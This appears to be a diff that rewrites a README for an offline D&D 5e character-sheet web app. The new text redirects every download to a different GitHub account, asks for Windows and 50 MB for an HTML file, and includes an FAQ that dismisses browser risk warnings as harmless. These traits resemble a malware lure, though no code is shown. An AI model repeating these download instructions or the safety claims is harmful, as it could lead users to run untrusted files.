@@ -1,110 +1,69 @@
-# D&D 5e Character Sheet - offline web app 2026
+# 🎲 dnd-character-sheet-webapp - Manage your Dungeons and Dragons characters easily
 
-> **A browser-run, single-file D&D 5e character sheet for offline play, with automated calculations, save and restore support, and a print-ready layout in the current release.**
+[![Download Now](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Carmelinasynthetic369/dnd-character-sheet-webapp)
 
-[![Platform](https://img.shields.io/badge/Platform-web%20browser-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/bennetttom95/dnd-character-sheet-webapp?style=flat-square)](https://github.com/bennetttom95/dnd-character-sheet-webapp)
+## 📂 About the Application
 
----
+The dnd-character-sheet-webapp helps players track Dungeons and Dragons 5th Edition character information. This tool runs entirely within your web browser. You do not need an active internet connection to use it once you open the file. It calculates your character statistics and ability modifiers as you type. You can save your progress to your local computer and load those files later to continue your game. The layout prints clearly on standard paper if you prefer a physical copy at the table.
 
-<p align="center">
-  <a href="https://bennetttom95.github.io/dnd-character-sheet-webapp/">
-    <img src="https://img.shields.io/badge/Download-D%26D%205e%20Character%20Sheet%20Latest-brightgreen?style=for-the-badge" alt="Download D&D 5e Character Sheet">
-  </a>
-</p>
+## 🛠️ System Requirements
 
-> **[Direct Download - D&D 5e Character Sheet v](https://bennetttom95.github.io/dnd-character-sheet-webapp/)**
+- A modern computer running Windows 10 or Windows 11.
+- Any web browser such as Google Chrome, Microsoft Edge, or Mozilla Firefox.
+- At least 50 megabytes of free space on your hard drive.
+- No additional software or programming environments are necessary to run this tool.
 
----
+## 🚀 Downloading the App
 
-[Download Latest Build](https://bennetttom95.github.io/dnd-character-sheet-webapp/)
+1. Visit the following address to access the file: [Download the character sheet](https://github.com/Carmelinasynthetic369/dnd-character-sheet-webapp).
+2. Look for the green button labeled Code on the right side of the page.
+3. Click the button and select Download ZIP.
+4. Open your Downloads folder in File Explorer once the download finishes.
+5. Right-click the file named dnd-character-sheet-webapp-main.zip.
+6. Select Extract All and choose a folder where you want to keep the application.
+7. Open the folder you just created.
 
----
+## ⚙️ Running the Character Sheet
 
-## Overview
+1. Locate the file named index.html within the extracted folder.
+2. Right-click the file.
+3. Select Open with from the menu.
+4. Choose your preferred web browser from the list of programs.
+5. The character sheet opens in a new tab.
+6. You may bookmark this page in your browser to find it faster in the future.
 
-D&D 5e Character Sheet is a standalone HTML character sheet meant to run directly in a web browser. It gives tabletop players a straightforward way to keep a character organized without needing a server, account, or installation step.
+## 📝 How to Use the Interface
 
-This app is built to simplify both session prep and live play. It pairs automatic math with structured sections for the areas of a character that tend to expand over time, such as inventory, spells, companions, notes, and related tracking pages.
+The interface mimics a standard physical character sheet. Click inside any text box to enter character details like name, class, or background. The application updates your ability scores and skill totals automatically. Use the checkbox indicators to track temporary hit points or limited uses of special abilities. 
 
----
+## 💾 Saving Your Progress
 
-## What it offers
+The application creates a local backup of your character data. Click the Save button at the bottom of the page when you finish your session. Your browser asks where to store the file on your computer. Choose a folder you can easily find, such as your Documents folder, and click Save. 
 
-- Single-file HTML app that works fully offline
-- D&D 5e character sheet with automatic calculations
-- Save and restore directly in the browser
-- Portrait upload and image handling
-- Character creation wizard for race, class, background, and equipment
-- Multiclass support with spell slots, features, and resources
-- Dedicated pages for inventory, spells, companions, notes, and more
-- Print-friendly layout with support for PDF-oriented output
+## 🔄 Loading Your Character
 
----
+1. Open your web browser and load the index.html file as you did before.
+2. Click the Load button at the top of the interface.
+3. Find the file you previously saved in your storage folder.
+4. Select the file and click Open.
+5. The sheet populates with your current character data.
 
-## Getting started
+## 🖨️ Printing Your Sheet
 
-1. Download or clone the repository.
-2. Open the HTML file directly in a modern web browser.
-3. No server setup is required for normal use.
+Ensure you have your character settings entered correctly before you print. Click the Print button located in the menu bar. Your browser opens the standard Windows print preview window. Select your printer and adjust settings like orientation to landscape or portrait if required. The document uses a simple design to save ink and remain readable during gameplay.
 
-To keep a local copy, store the HTML file anywhere on your machine and open it from disk whenever you want to use the sheet.
+## 🔧 Frequently Asked Questions
 
----
+Do I need to be online?
+No. You only need the internet to download the file initially. The sheet runs locally on your machine after that.
 
-## How to use it
+Can I open the file on my phone?
+The tool works best on desktop browsers to ensure the layout displays properly. Mobile performance may vary based on your screen size.
 
-Open the file in your browser first, then use the character creation wizard to build a new sheet or load an existing one. As you enter race, class, background, equipment, and other details, the sheet updates the main values automatically.
+My browser says the file is risky. What does this mean?
+Browsers show warnings for any downloaded file. This file contains only web code used to create the character sheet and does not contain malicious software.
 
-A common flow looks like this:
+Does this store data on a server?
+No. Your character data stays on your personal computer. The application does not send your private character details to any remote server or website.
 
-1. Create a new character in the wizard.
-2. Enter or adjust class, level, and multiclass details.
-3. Add inventory, spells, companions, and notes on the dedicated pages.
-4. Save your work through the browser-based restore flow.
-5. Use the print-friendly layout when you want a paper or PDF copy.
-
----
-
-## Configuration
-
-Most options live inside the sheet itself and are preserved through the browser workflow. Because this is a single-file application, there is no separate configuration folder to maintain.
-
-If you want to keep changes, make sure the HTML file and your saved browser data stay in the same browser profile you normally use for the sheet.
-
----
-
-## Requirements
-
-- A modern web browser
-- Local file access or a place to open the HTML file
-- Enough browser storage for saved character data, portraits, and notes
-- A device suitable for printing if you plan to export to PDF
-
----
-
-## FAQ
-
-**Does it need an internet connection?**  
-No. The app is designed to run offline in a browser.
-
-**Do I need to install anything?**  
-No installation is needed. Open the HTML file and begin using it.
-
-**Where are saves kept?**  
-Saves are managed through the browser-based save and restore flow.
-
-**Can I print my character?**  
-Yes. The layout is built to be print-friendly and works well for PDF output.
-
-**What if my browser does not save data correctly?**  
-Try another browser or browser profile, then reopen the file and run through the save process again.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: tabletop, rpg, character-sheet, dnd, 5e, game-aid, utility
